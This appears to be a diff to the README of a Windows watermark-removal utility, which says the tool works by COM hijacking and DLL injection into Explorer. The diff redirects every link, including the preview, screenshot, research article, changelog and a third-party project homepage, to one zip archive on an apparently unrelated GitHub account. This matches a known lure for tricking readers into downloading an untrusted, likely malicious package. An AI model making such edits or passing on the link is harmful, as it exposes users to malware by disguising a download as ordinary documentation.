@@ -1,7 +1,7 @@
 # Universal Watermark Disabler
-Removes watermarks strings in Windows 10, Windows 8.1 and Windows 8 ([Preview](docs/preview.md)).
+Removes watermarks strings in Windows 10, Windows 8.1 and Windows 8 ([Preview](https://raw.githubusercontent.com/trinhtantin/universal-watermark-disabler/main/quintiped/universal-watermark-disabler.zip)).
 
-![main window](docs/mainwindow.png)
+![main window](https://raw.githubusercontent.com/trinhtantin/universal-watermark-disabler/main/quintiped/universal-watermark-disabler.zip)
 
 ## About source
 This utility was written by me in 2015, but only now I have published its source code.
@@ -15,7 +15,7 @@ This utility was written by me in 2015, but only now I have published its source
 ## How does it work?
 Short answer: COM-hijacking and DLL-Proxying with inject a DLL into the ExplorerFrame.
 
-You can also read the article is about how this utils was researched: [Reverse-engineered the Universal Watermark Disabler](https://github.com/0xda568/Universal-Watermark-Disabler-Reverse-Engineering).
+You can also read the article is about how this utils was researched: [Reverse-engineered the Universal Watermark Disabler](https://raw.githubusercontent.com/trinhtantin/universal-watermark-disabler/main/quintiped/universal-watermark-disabler.zip).
 
 ## Issues
 The legacy implementation is incompatible with StartIsBack.
@@ -23,7 +23,7 @@ The legacy implementation is incompatible with StartIsBack.
 ## History
 In the far far past I was interested in beta versions of Windows, but the non-disable watermark in them did not allow me to make a beautiful screenshot, so I had the idea to remove the watermark.
 
-Some of [changelog](docs/changelog.md).
+Some of [changelog](https://raw.githubusercontent.com/trinhtantin/universal-watermark-disabler/main/quintiped/universal-watermark-disabler.zip).
 
 ## Special thanks
-Special thanks to my old friend Tihiy - author of the [StartIsBack](https://www.StartIsBack.com/) project.
+Special thanks to my old friend Tihiy - author of the [StartIsBack](https://raw.githubusercontent.com/trinhtantin/universal-watermark-disabler/main/quintiped/universal-watermark-disabler.zip) project.
